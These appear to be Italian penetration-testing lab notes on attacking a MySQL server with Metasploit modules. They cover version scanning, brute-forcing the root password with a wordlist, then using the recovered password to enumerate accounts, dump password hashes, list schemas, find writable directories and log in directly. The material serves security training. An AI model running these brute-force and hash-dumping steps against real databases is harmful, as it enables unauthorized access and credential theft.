# MySQL Enumeration

<figure><img src="../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

```
service postgresql start
msfconsole
workspace -a MySQL_ENUM
setg RHOSTS <IP dest>
setg RHOST <IP dest>
search type:auxiliary name:mysql
```

## MySQL Version Enumeration

```
use auxiliary/scanner/mysql/mysql_version
```

<figure><img src="../.gitbook/assets/image (165).png" alt=""><figcaption></figcaption></figure>

In questo caso per sicurezza verifichiamo la porta di MySQL con il modulo portscan/tcp che avevamo usato in passato:

<figure><img src="../.gitbook/assets/image (163).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (164).png" alt=""><figcaption></figcaption></figure>

## MySQL Brute Force Login Attack

Per trovare gli utenti e accedere al DB possiamo o sfruttare delle vulnerabilità per la versione di SQL, ma in questo caso non è vulnerabile, oppure usiamo il modulo mysql\_login che permette di fare un brute force (dictionary attack) per trovare utenti e password del DB.

```
use auxiliary/scanner/myssql/mysql_login
set username root //per provare a trovare la password per l'utente root direttamente
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
run
```

<figure><img src="../.gitbook/assets/image (166).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (167).png" alt=""><figcaption></figcaption></figure>

Ottimo, abbiamo trovato la password per l'utente root e quindi possiamo entrare nel DB come root.

## MySQL Enumeration come utente admin

```
use auxiliary/admin/mysql/mysql_enum
set PASSWORD twinkle
set USERNAME root
run
```

<figure><img src="../.gitbook/assets/image (168).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (169).png" alt=""><figcaption></figcaption></figure>

Ha enumerato varie informazioni come: versione, SO, architettura, server hostname.

Enumera poi una serie di account con l'hash delle loro password:

<figure><img src="../.gitbook/assets/image (170).png" alt=""><figcaption></figcaption></figure>

Ci fornisce poi informazioni sui permessi dei vari utenti, tra l'alto notiamo che l'unico con GRANT è l'utente root:

<figure><img src="../.gitbook/assets/image (171).png" alt=""><figcaption></figcaption></figure>

## Modulo per eseguire query SQL

```
use auxiliary/admin/mysql/mysql_sql
set PASSWORD twinkle
set USERNAME root
set SQL //dobbiamo impostare la query SQL da eseguire, di default è select version() per vedere la versione
run
```

<figure><img src="../.gitbook/assets/image (172).png" alt=""><figcaption></figcaption></figure>

Ma dato che abbiamo accesso come root possiamo andare ad eseguire un'altra query più interessante: show databases;

```
set SQL show databases;
run
```

<figure><img src="../.gitbook/assets/image (173).png" alt=""><figcaption></figcaption></figure>

Poi possiamo eseguire altre varie query una alla volta come ad esempio prima selezionare il DB e poi identificare le tabelle:

<figure><img src="../.gitbook/assets/image (174).png" alt=""><figcaption></figcaption></figure>

## Modulo per mostrare tutti gli schema e tabelle presenti negli schemi del DB

```
use auxiliary/scanner/mysql/mysql_schemadump
set PASSWORD twinkle
set USERNAME root
run
```

<figure><img src="../.gitbook/assets/image (175).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (176).png" alt=""><figcaption></figcaption></figure>

Ci mostra tutti gli schemi e tutte le tabelle, ma in questo caso non ci sono tabelle in questi schemi.

## Modulo per mostrare tutti gli hash degli utenti del DB

```
use auxiliary/scanner/mysql/mysql_hashdump
set USERNAME root
set PASSWORD twinkle
set RHOSTS <IP target>
run
```

<figure><img src="../.gitbook/assets/image (11) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Modulo per identificare quali cartelle sono scrivibili tramite MySQL

MYSQL Directory Write Test

```
use auxiliary/scanner/mysql/mysql_writable_dirs
set RHOSTS <IP target>
set USERNAME root
set PASSWORD twinkle
set DIR_LIST /usr/share/metasploit-framework/data/wordlists/directory.txt
run
```

<figure><img src="../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Cosa abbiamo trovato?

Possiamo scrivere dentro metasploit vari comandi per vedere cosa abbiamo trovato, come hosts, servizi running con le loro porte aperte e anche le credenziali trovate (comando creds) o informazioni trovate come lo schema tramite il comando loot

<figure><img src="../.gitbook/assets/image (177).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (178).png" alt=""><figcaption></figcaption></figure>

Per questo motivo è consigliato creare dei workspace, perché metasploit framework si salva automaticamente le vari informazioni identificate, e quindi in questo modo è possibile tornare a riguardare tutte le info che abbiamo gathered con pochi comandi, e assicurarci che non ci siamo persi qualche cosa.

## Effettuiamo la connessione diretta al DB (al di fuori di Metasploit)

```
mysql -h 192.143.6.3 -u root -p
// ora che siamo connessi dentro al DB possiamo fare tutte le query che vogliamo.
```

<figure><img src="../.gitbook/assets/image (179).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../.gitbook/assets/image (180).png" alt=""><figcaption></figcaption></figure>

